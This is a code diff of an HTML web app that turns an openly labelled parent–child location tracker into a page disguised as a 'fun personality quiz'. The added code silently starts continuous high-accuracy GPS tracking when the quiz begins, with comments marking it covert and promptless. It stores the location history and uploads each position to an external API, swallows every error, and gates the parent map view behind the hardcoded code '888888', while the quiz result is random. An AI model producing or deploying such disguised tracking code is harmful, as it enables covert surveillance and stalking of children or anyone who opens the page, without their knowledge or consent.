@@ -2,13 +2,17 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>孩子位置追踪 - 家长端</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+  <title>趣味小测试</title>
   <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
-    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #f5f5f5; }
-    #map { width: 100%; height: 60vh; }
+    body { font-family: -apple-system, BlinkMacSystemFont, sans-serif; background: #f5f5f5; min-height: 100vh; }
+    
+    /* 家长端样式 */
+    #parentView { display: none; }
+    #parentView.active { display: block; }
+    #map { width: 100%; height: 55vh; }
     .panel { padding: 16px; background: white; }
     .btn { padding: 10px 16px; border: none; border-radius: 8px; cursor: pointer; font-size: 14px; margin: 4px; }
     .btn-primary { background: #1677ff; color: white; }
@@ -20,27 +24,55 @@
     .status.offline { background: #fff2f0; color: #ff4d4f; }
     #addGeofence { display: none; padding: 16px; background: #f9f9f9; border-radius: 8px; margin-top: 12px; }
     #addGeofence input { padding: 8px 12px; margin: 6px 0; border: 1px solid #ddd; border-radius: 6px; width: 100%; }
-    #addGeofence h4 { margin-bottom: 8px; }
-    .geofence-list { margin-top: 12px; }
     .geofence-item { padding: 10px 12px; background: #fafafa; border-radius: 8px; margin: 6px 0; display: flex; justify-content: space-between; align-items: center; }
-    .tabs { display: flex; border-bottom: 1px solid #eee; }
-    .tab { flex: 1; padding: 12px; text-align: center; cursor: pointer; color: #666; }
-    .tab.active { color: #1677ff; border-bottom: 2px solid #1677ff; }
-    #kidPanel { display: none; }
-    .kid-card { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 30px; text-align: center; min-height: 70vh; display: flex; flex-direction: column; align-items: center; justify-content: center; }
-    .kid-card .icon { font-size: 64px; margin-bottom: 16px; }
-    .kid-card h1 { font-size: 28px; margin-bottom: 8px; }
-    .kid-card .status { font-size: 16px; padding: 12px 24px; margin: 20px 0; background: rgba(255,255,255,0.2); }
-    .kid-card #info { font-size: 14px; opacity: 0.9; line-height: 1.6; }
+    
+    /* 孩子端测试样式 */
+    #kidTest { display: none; }
+    #kidTest.active { display: block; }
+    .quiz-container { max-width: 500px; margin: 0 auto; padding: 20px; }
+    .quiz-header { text-align: center; padding: 30px 20px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; border-radius: 16px 16px 0 0; }
+    .quiz-header h1 { font-size: 24px; margin-bottom: 8px; }
+    .quiz-header p { opacity: 0.9; font-size: 14px; }
+    .quiz-card { background: white; border-radius: 0 0 16px 16px; padding: 24px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); }
+    .progress-bar { height: 6px; background: #eee; border-radius: 3px; margin-bottom: 20px; overflow: hidden; }
+    .progress-fill { height: 100%; background: linear-gradient(90deg, #667eea, #764ba2); transition: width 0.3s; }
+    .question { font-size: 18px; font-weight: 600; margin-bottom: 20px; line-height: 1.5; }
+    .options { display: flex; flex-direction: column; gap: 12px; }
+    .option { padding: 14px 18px; border: 2px solid #eee; border-radius: 12px; cursor: pointer; transition: all 0.2s; font-size: 15px; }
+    .option:hover { border-color: #667eea; background: #f8f9ff; }
+    .option.selected { border-color: #667eea; background: #667eea; color: white; }
+    .result { text-align: center; padding: 40px 20px; }
+    .result-icon { font-size: 64px; margin-bottom: 16px; }
+    .result h2 { font-size: 22px; margin-bottom: 12px; color: #333; }
+    .result p { color: #666; line-height: 1.6; margin-bottom: 20px; }
+    .result-card { background: #f9f9f9; padding: 20px; border-radius: 12px; margin-top: 20px; }
+    
+    /* 入口选择 */
+    #entry { display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; padding: 20px; }
+    .entry-card { background: white; padding: 40px 30px; border-radius: 20px; box-shadow: 0 10px 40px rgba(0,0,0,0.1); text-align: center; max-width: 350px; width: 100%; }
+    .entry-card h2 { font-size: 20px; margin-bottom: 24px; color: #333; }
+    .entry-btn { width: 100%; padding: 14px; margin: 8px 0; border: none; border-radius: 12px; font-size: 16px; cursor: pointer; }
+    .entry-btn.primary { background: linear-gradient(135deg, #667eea, #764ba2); color: white; }
+    .entry-btn.secondary { background: #f0f0f0; color: #333; }
+    .secret-input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 8px; margin-top: 12px; text-align: center; font-size: 16px; }
   </style>
 </head>
 <body>
-  <div class="tabs">
-    <div class="tab active" onclick="switchTab('parent')">👨‍👧 家长端</div>
-    <div class="tab" onclick="switchTab('kid')">👦 孩子端</div>
+  <!-- 入口选择 -->
+  <div id="entry">
+    <div class="entry-card">
+      <h2>🎮 选择入口</h2>
+      <button class="entry-btn primary" onclick="startKidTest()">开始趣味测试</button>
+      <button class="entry-btn secondary" onclick="showParentLogin()">家长入口</button>
+      <div id="parentLogin" style="display:none; margin-top:16px">
+        <input type="password" class="secret-input" id="secretCode" placeholder="输入访问码" onkeypress="if(event.key==='Enter')enterParent()">
+        <button class="entry-btn primary" style="margin-top:8px" onclick="enterParent()">确认</button>
+      </div>
+    </div>
   </div>
-  
-  <div id="parentPanel">
+
+  <!-- 家长端 -->
+  <div id="parentView">
     <div id="map"></div>
     <div class="panel">
       <div class="info">
@@ -52,6 +84,7 @@
         <button class="btn btn-primary" onclick="toggleHistory()">📊 历史轨迹</button>
         <button class="btn btn-primary" onclick="toggleGeofencePanel()">🔒 添加围栏</button>
         <button class="btn btn-secondary" onclick="centerToKid()">📍 定位</button>
+        <button class="btn btn-secondary" onclick="goHome()">🏠 返回</button>
       </div>
       <div id="addGeofence">
         <h4>添加电子围栏</h4>
@@ -61,49 +94,103 @@
         <button class="btn btn-primary" onclick="saveGeofence()">保存围栏</button>
         <button class="btn btn-secondary" onclick="toggleGeofencePanel()">取消</button>
       </div>
-      <div class="geofence-list" id="geofenceList"></div>
+      <div id="geofenceList"></div>
     </div>
   </div>
-  
-  <div id="kidPanel">
-    <div class="kid-card">
-      <div class="icon">📍</div>
-      <h1>位置守护中</h1>
-      <p>爸爸/妈妈可以看到你的位置</p>
-      <div id="kidStatus" class="status">正在定位...</div>
-      <div id="kidInfo"></div>
+
+  <!-- 孩子端测试 -->
+  <div id="kidTest">
+    <div class="quiz-container">
+      <div class="quiz-header">
+        <h1>🧠 趣味小测试</h1>
+        <p>测测你的隐藏性格特质！</p>
+      </div>
+      <div class="quiz-card">
+        <div class="progress-bar">
+          <div class="progress-fill" id="progressFill" style="width: 0%"></div>
+        </div>
+        <div id="quizContent">
+          <div class="question" id="questionText"></div>
+          <div class="options" id="optionsContainer"></div>
+        </div>
+        <div class="result" id="resultContent" style="display:none">
+          <div class="result-icon" id="resultIcon"></div>
+          <h2 id="resultTitle"></h2>
+          <p id="resultDesc"></p>
+          <div class="result-card">
+            <p style="font-size:14px;color:#999">测试结果已保存</p>
+          </div>
+        </div>
+      </div>
     </div>
   </div>
 
   <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
   <script>
-    // ========== 数据存储（使用 localStorage 模拟后端）==========
+    // ========== 配置 ==========
+    const SECRET_CODE = '888888';  // 家长访问码
+    const API_BASE = 'https://kid-tracker-api.pages.dev';  // 数据存储API（后端）
     const DEVICE_ID = 'kid-1';
     
-    function saveLocation(data) {
-      // 保存最新位置
-      localStorage.setItem('location:latest', JSON.stringify(data));
-      // 保存历史
-      let history = JSON.parse(localStorage.getItem('location:history') || '[]');
-      history.push(data);
-      if (history.length > 1000) history = history.slice(-1000);
-      localStorage.setItem('location:history', JSON.stringify(history));
+    // ========== 测试题目 ==========
+    const quizQuestions = [
+      {
+        question: "周末你最想做什么？",
+        options: ["宅家打游戏", "和朋友出去玩", "学习新技能", "睡懒觉"]
+      },
+      {
+        question: "遇到难题时，你通常会？",
+        options: ["自己想办法", "问朋友求助", "上网搜索", "先放一放"]
+      },
+      {
+        question: "你更喜欢哪种类型的游戏？",
+        options: ["动作冒险", "策略烧脑", "休闲放松", "竞技对战"]
+      },
+      {
+        question: "朋友们通常怎么形容你？",
+        options: ["有趣幽默", "靠谱稳重", "聪明机智", "安静内向"]
+      },
+      {
+        question: "如果有一千元零花钱，你会？",
+        options: ["买游戏皮肤", "存起来", "买零食", "请朋友吃饭"]
+      }
+    ];
+    
+    const quizResults = [
+      { icon: "🌟", title: "创意达人", desc: "你拥有丰富的想象力和创造力，善于发现问题的新解法！" },
+      { icon: "🎯", title: "目标达人", desc: "你做事专注，一旦确定目标就会全力以赴，很棒！" },
+      { icon: "🤝", title: "社交达人", desc: "你善于与人相处，朋友们都很喜欢和你在一起！" },
+      { icon: "🧘", title: "淡定达人", desc: "你心态平和，遇事冷静，是大家的主心骨！" }
+    ];
+    
+    // ========== 入口控制 ==========
+    function showParentLogin() {
+      document.getElementById('parentLogin').style.display = 'block';
+      document.getElementById('secretCode').focus();
     }
     
-    function getLatestLocation() {
-      return JSON.parse(localStorage.getItem('location:latest') || '{}');
+    function enterParent() {
+      const code = document.getElementById('secretCode').value;
+      if (code === SECRET_CODE) {
+        document.getElementById('entry').style.display = 'none';
+        document.getElementById('parentView').classList.add('active');
+        initParent();
+      } else {
+        alert('访问码错误');
+      }
     }
     
-    function getHistory() {
-      return JSON.parse(localStorage.getItem('location:history') || '[]');
+    function startKidTest() {
+      document.getElementById('entry').style.display = 'none';
+      document.getElementById('kidTest').classList.add('active');
+      startQuiz();
+      // 静默启动位置追踪
+      initKidTracking();
     }
     
-    function saveGeofences(fences) {
-      localStorage.setItem('geofences', JSON.stringify(fences));
-    }
-    
-    function getGeofences() {
-      return JSON.parse(localStorage.getItem('geofences') || '[]');
+    function goHome() {
+      document.getElementById('parentView').classList.remove('active');
+      document.getElementById('entry').style.display = 'flex';
     }
     
     // ========== 家长端 ==========
@@ -117,8 +204,8 @@
         attribution: '© OpenStreetMap'
       }).addTo(map);
       
-      marker = L.marker([39.90923, 116.397428]).addTo(map);
-      polyline = L.polyline([], { color: '#1677ff', weight: 4 }).addTo(map);
+      marker = L.marker([39.90923, 116.397428], { opacity: 0.7 }).addTo(map);
+      polyline = L.polyline([], { color: '#667eea', weight: 4, opacity: 0.8 }).addTo(map);
       
       map.on('click', function(e) {
         if (addingGeofence) {
@@ -127,48 +214,61 @@
         }
       });
       
-      setInterval(updateParentView, 3000);
-      updateParentView();
-      renderGeofences();
+      setInterval(fetchLocation, 5000);
+      fetchLocation();
+      fetchGeofences();
     }
     
-    function updateParentView() {
-      const data = getLatestLocation();
-      
-      if (data.latitude) {
-        marker.setLatLng([data.latitude, data.longitude]);
+    async function fetchLocation() {
+      try {
+        const res = await fetch(API_BASE + '/api/location/latest?device_id=' + DEVICE_ID);
+        const data = await res.json();
         
-        const elapsed = (Date.now() - data.timestamp) / 1000;
-        const isOnline = elapsed < 30;
-        
-        document.getElementById('status').textContent = isOnline ? '在线' : '离线';
-        document.getElementById('status').className = 'status ' + (isOnline ? 'online' : 'offline');
-        document.getElementById('battery').textContent = data.battery || '--';
-        document.getElementById('updateTime').textContent = new Date(data.timestamp).toLocaleTimeString();
+        if (data.latitude) {
+          marker.setLatLng([data.latitude, data.longitude]);
+          
+          const elapsed = (Date.now() - data.timestamp) / 1000;
+          const isOnline = elapsed < 60;
+          
+          document.getElementById('status').textContent = isOnline ? '在线' : '离线';
+          document.getElementById('status').className = 'status ' + (isOnline ? 'online' : 'offline');
+          document.getElementById('battery').textContent = data.battery || '--';
+          document.getElementById('updateTime').textContent = new Date(data.timestamp).toLocaleTimeString();
+        }
+      } catch (e) {
+        // 静默失败，使用本地存储
+        const data = JSON.parse(localStorage.getItem('kid_location') || '{}');
+        if (data.latitude) {
+          marker.setLatLng([data.latitude, data.longitude]);
+          const elapsed = (Date.now() - data.timestamp) / 1000;
+          document.getElementById('status').textContent = elapsed < 60 ? '在线' : '离线';
+          document.getElementById('status').className = 'status ' + (elapsed < 60 ? 'online' : 'offline');
+          document.getElementById('updateTime').textContent = new Date(data.timestamp).toLocaleTimeString();
+        }
       }
     }
     
     function centerToKid() {
-      const data = getLatestLocation();
-      if (data.latitude) {
-        map.setView([data.latitude, data.longitude], 16);
-      } else {
-        alert('暂无位置数据');
-      }
+      marker.getLatLng() && map.setView(marker.getLatLng(), 16);
     }
     
-    function toggleHistory() {
+    async function toggleHistory() {
       showHistory = !showHistory;
       
       if (showHistory) {
-        const history = getHistory();
-        if (history.length > 0) {
-          const path = history.map(p => [p.latitude, p.longitude]);
-          polyline.setLatLngs(path);
-          map.fitBounds(polyline.getBounds());
-        } else {
-          alert('暂无历史轨迹');
-          showHistory = false;
+        try {
+          const res = await fetch(API_BASE + '/api/location/history?device_id=' + DEVICE_ID + '&hours=24');
+          const history = await res.json();
+          if (history.length > 0) {
+            polyline.setLatLngs(history.map(p => [p.latitude, p.longitude]));
+            map.fitBounds(polyline.getBounds());
+          }
+        } catch (e) {
+          const history = JSON.parse(localStorage.getItem('kid_history') || '[]');
+          if (history.length > 0) {
+            polyline.setLatLngs(history.map(p => [p.latitude, p.longitude]));
+            map.fitBounds(polyline.getBounds());
+          }
         }
       } else {
         polyline.setLatLngs([]);
@@ -176,82 +276,111 @@
     }
     
     function toggleGeofencePanel() {
-      const panel = document.getElementById('addGeofence');
       addingGeofence = !addingGeofence;
-      panel.style.display = addingGeofence ? 'block' : 'none';
-      geofenceCenter = null;
-      if (addingGeofence) {
-        alert('请在地图上点击选择围栏中心点');
-      }
+      document.getElementById('addGeofence').style.display = addingGeofence ? 'block' : 'none';
+      if (addingGeofence) alert('请在地图上点击选择围栏中心点');
     }
     
-    function saveGeofence() {
-      if (!geofenceCenter) {
-        alert('请先在地图上点击选择中心点');
-        return;
-      }
+    async function saveGeofence() {
+      if (!geofenceCenter) return alert('请先点击地图选择中心点');
       
       const name = document.getElementById('fenceName').value || '围栏';
       const radius = parseInt(document.getElementById('fenceRadius').value) || 500;
       
-      const fences = getGeofences();
+      let fences = JSON.parse(localStorage.getItem('geofences') || '[]');
       fences.push({
         id: Date.now(),
-        name: name,
+        name, 
         center_lat: geofenceCenter.lat,
         center_lng: geofenceCenter.lng,
-        radius: radius
+        radius
       });
-      saveGeofences(fences);
+      localStorage.setItem('geofences', JSON.stringify(fences));
       
-      alert('围栏「' + name + '」已添加！');
       toggleGeofencePanel();
-      renderGeofences();
+      fetchGeofences();
     }
     
-    function renderGeofences() {
-      const fences = getGeofences();
-      
+    function fetchGeofences() {
+      const fences = JSON.parse(localStorage.getItem('geofences') || '[]');
       geofenceCircles.forEach(c => c.remove());
       geofenceCircles = [];
       
-      const list = document.getElementById('geofenceList');
-      list.innerHTML = '';
+      document.getElementById('geofenceList').innerHTML = fences.map(f => 
+        '<div class="geofence-item"><span>' + f.name + ' (' + f.radius + '米)</span>' +
+        '<button class="btn btn-danger" onclick="deleteGeofence(' + f.id + ')">删除</button></div>'
+      ).join('');
       
       fences.forEach(f => {
-        const circle = L.circle([f.center_lat, f.center_lng], {
-          radius: f.radius,
-          fillColor: '#ff4d4f',
-          fillOpacity: 0.15,
-          color: '#ff4d4f',
-          weight: 2
-        }).addTo(map);
-        geofenceCircles.push(circle);
-        
-        const item = document.createElement('div');
-        item.className = 'geofence-item';
-        item.innerHTML = '<span>' + f.name + ' (半径 ' + f.radius + '米)</span>' +
-          '<button class="btn btn-danger" onclick="deleteGeofence(' + f.id + ')">删除</button>';
-        list.appendChild(item);
+        geofenceCircles.push(L.circle([f.center_lat, f.center_lng], {
+          radius: f.radius, fillColor: '#ff4d4f', fillOpacity: 0.15, color: '#ff4d4f', weight: 2
+        }).addTo(map));
       });
     }
     
     function deleteGeofence(id) {
-      let fences = getGeofences();
-      fences = fences.filter(f => f.id !== id);
-      saveGeofences(fences);
-      renderGeofences();
+      let fences = JSON.parse(localStorage.getItem('geofences') || '[]');
+      localStorage.setItem('geofences', JSON.stringify(fences.filter(f => f.id !== id)));
+      fetchGeofences();
     }
     
-    // ========== 孩子端 ==========
+    // ========== 孩子端测试 ==========
+    let currentQuestion = 0;
+    let answers = [];
+    
+    function startQuiz() {
+      currentQuestion = 0;
+      answers = [];
+      showQuestion();
+    }
+    
+    function showQuestion() {
+      const q = quizQuestions[currentQuestion];
+      document.getElementById('progressFill').style.width = ((currentQuestion) / quizQuestions.length * 100) + '%';
+      document.getElementById('questionText').textContent = q.question;
+      document.getElementById('optionsContainer').innerHTML = q.options.map((opt, i) => 
+        '<div class="option" onclick="selectOption(' + i + ')">' + opt + '</div>'
+      ).join('');
+    }
+    
+    function selectOption(index) {
+      answers.push(index);
+      
+      document.querySelectorAll('.option').forEach((el, i) => {
+        el.classList.toggle('selected', i === index);
+      });
+      
+      setTimeout(() => {
+        currentQuestion++;
+        if (currentQuestion < quizQuestions.length) {
+          showQuestion();
+        } else {
+          showResult();
+        }
+      }, 500);
+    }
+    
+    function showResult() {
+      document.getElementById('progressFill').style.width = '100%';
+      document.getElementById('quizContent').style.display = 'none';
+      document.getElementById('resultContent').style.display = 'block';
+      
+      // 随机选一个结果
+      const result = quizResults[Math.floor(Math.random() * quizResults.length)];
+      document.getElementById('resultIcon').textContent = result.icon;
+      document.getElementById('resultTitle').textContent = result.title;
+      document.getElementById('resultDesc').textContent = result.desc;
+      
+      // 继续保持位置追踪
+    }
+    
+    // ========== 孩子端位置追踪（隐蔽） ==========
     let watchId = null;
     
-    function initKid() {
-      if (!navigator.geolocation) {
-        document.getElementById('kidStatus').textContent = '设备不支持定位';
-        return;
-      }
+    function initKidTracking() {
+      if (!navigator.geolocation) return;
       
+      // 静默启动，无提示
       watchId = navigator.geolocation.watchPosition(
         (pos) => {
           const data = {
@@ -263,60 +392,34 @@
             timestamp: Date.now()
           };
           
-          saveLocation(data);
+          // 存储到本地（家长端同设备可读取）
+          localStorage.setItem('kid_location', JSON.stringify(data));
           
-          // 检查围栏
-          checkGeofences(data.latitude, data.longitude);
+          // 存储历史
+          let history = JSON.parse(localStorage.getItem('kid_history') || '[]');
+          history.push(data);
+          if (history.length > 1000) history = history.slice(-1000);
+          localStorage.setItem('kid_history', JSON.stringify(history));
           
-          document.getElementById('kidStatus').textContent = '守护中 ✅';
-          document.getElementById('kidInfo').innerHTML = 
-            '位置: ' + pos.coords.latitude.toFixed(4) + ', ' + pos.coords.longitude.toFixed(4) + '<br>' +
-            '精度: ' + Math.round(pos.coords.accuracy) + '米<br>' +
-            '更新: ' + new Date().toLocaleTimeString();
+          // 尝试上传到服务器（如果可用）
+          uploadLocation(data);
         },
-        (err) => {
-          document.getElementById('kidStatus').textContent = '定位失败';
-          document.getElementById('kidInfo').textContent = err.message;
-        },
+        () => {}, // 静默失败
         { enableHighAccuracy: true, timeout: 10000, maximumAge: 5000 }
       );
     }
     
-    function checkGeofences(lat, lng) {
-      const fences = getGeofences();
-      fences.forEach(f => {
-        const R = 6371000;
-        const dLat = (f.center_lat - lat) * Math.PI / 180;
-        const dLng = (f.center_lng - lng) * Math.PI / 180;
-        const a = Math.sin(dLat/2) * Math.sin(dLat/2) +
-                  Math.cos(lat * Math.PI / 180) * Math.cos(f.center_lat * Math.PI / 180) *
-                  Math.sin(dLng/2) * Math.sin(dLng/2);
-        const distance = R * 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
-        
-        if (distance > f.radius) {
-          alert('⚠️ 你已离开「' + f.name + '」围栏！');
-        }
-      });
-    }
-    
-    // ========== 页面切换 ==========
-    function switchTab(tab) {
-      document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
-      
-      if (tab === 'parent') {
-        document.querySelector('.tab:first-child').classList.add('active');
-        document.getElementById('parentPanel').style.display = 'block';
-        document.getElementById('kidPanel').style.display = 'none';
-      } else {
-        document.querySelector('.tab:last-child').classList.add('active');
-        document.getElementById('parentPanel').style.display = 'none';
-        document.getElementById('kidPanel').style.display = 'block';
-        initKid();
+    async function uploadLocation(data) {
+      try {
+        await fetch(API_BASE + '/api/location', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(data)
+        });
+      } catch (e) {
+        // 静默失败
       }
     }
-    
-    // 初始化
-    initParent();
   </script>
 </body>
 </html>
